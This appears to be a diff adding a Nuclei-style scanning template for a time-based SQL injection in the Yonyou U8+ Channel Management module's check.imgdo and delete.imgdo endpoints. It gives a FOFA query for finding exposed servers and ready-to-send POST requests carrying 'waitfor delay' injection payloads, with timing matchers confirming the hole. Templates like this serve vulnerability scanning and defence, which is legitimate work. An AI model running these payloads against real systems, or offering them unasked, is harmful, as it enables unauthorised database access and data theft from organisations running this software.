@@ -1,0 +1,33 @@
+id: yonyou-u8-channel-checkdelete-sqli
+info:
+  name: "用友 U8+ 渠道管理 (高级版) check.imgdo 与 delete.imgdo 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="渠道管理（高级版）"
+      用友U8+作为用友网络科技股份有限公司研发的企业级管理平台，在渠道管理（高级版）模块中，其check.imgdo和delete.imgdo接口存在SQL注入缺陷。该漏洞源于接口对用户输入参数缺乏有效过滤和安全验证机制，允许攻击者通过构造恶意输入参数，利用HTTP请求将恶意SQL代码注入后端数据库查询流程。攻击者可借此实现数据库敏感信息窃取、数据篡改等恶意操作。
+      POST /business/test/delete.imgdo HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+
+      _id=1&photoName=a%'waitfor delay'0:0:5'-- -
+  tags: 用友U8
+http:
+- raw:
+  - |
+    POST /business/test/check.imgdo HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    _id='waitfor delay'0:0:5'-- -
+  - |
+    POST /business/test/check.imgdo HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    _id='waitfor delay'0:0:8'-- -
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
